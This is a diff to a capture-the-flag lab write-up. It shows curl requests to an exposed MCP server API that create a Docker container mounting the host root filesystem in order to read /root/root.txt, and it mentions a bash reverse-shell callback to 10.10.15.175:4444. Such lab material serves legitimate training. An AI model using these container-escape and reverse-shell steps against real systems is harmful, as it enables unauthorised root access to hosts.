@@ -35,7 +35,7 @@ Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
 		  "serverId": "docker"
 		}'
 # Final exploitation
-- creating new Docker container using enumerated service image, and mounting `/` as `/exp`, which allows to read every system file, including `/root/root.txt` leading to flag compromise
+creating new Docker container using enumerated service image, and mounting `/` as `/exp`, which allows to read every system file, including `/root/root.txt` leading to flag compromise
   
 		curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 		-H "Content-Type: application/json" \
@@ -47,3 +47,4 @@ Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
 		  },
 		  "serverId": "flagattempt3"
 		}'
+`--rm` flag may be used to delete Docker container after exploit execution, however its not nescessary
